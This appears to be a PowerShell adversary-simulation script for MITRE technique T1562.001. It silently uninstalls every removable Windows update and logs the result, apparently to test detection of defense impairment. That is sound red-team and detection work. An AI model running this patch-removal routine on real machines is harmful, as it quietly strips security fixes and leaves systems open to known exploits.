<#
    T1562.001 - Impair Defenses: Disable or Modify Tools
    Uninstall all windows updates installed on the system (all that can be uninstalled)
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

try{
    $updates = Get-WmiObject -Class "Win32_QuickFixEngineering"
    Foreach ($update in $updates){
        $KB = ($update.HotFixID).Trim('KB')
        Write-Host -ForegroundColor Cyan "Uninstalling update $KB ..."
        Invoke-Expression -Command "wusa.exe /uninstall /kb:$KB /quiet /norestart"
    }

    $updates_after = Get-WmiObject -Class "Win32_QuickFixEngineering"
    $diff = Compare-Object -ReferenceObject $updates -DifferenceObject $updates_after
    if ($diff){
        Write-Host -ForegroundColor Green "Some updates have been uninstalled"
    }
    else{
        Write-Host -ForegroundColor Yellow "Cannot uninstall existing updates"
    }
}
catch{
    Write-Host -ForegroundColor Red "Error: $_"
}

Stop-Transcript
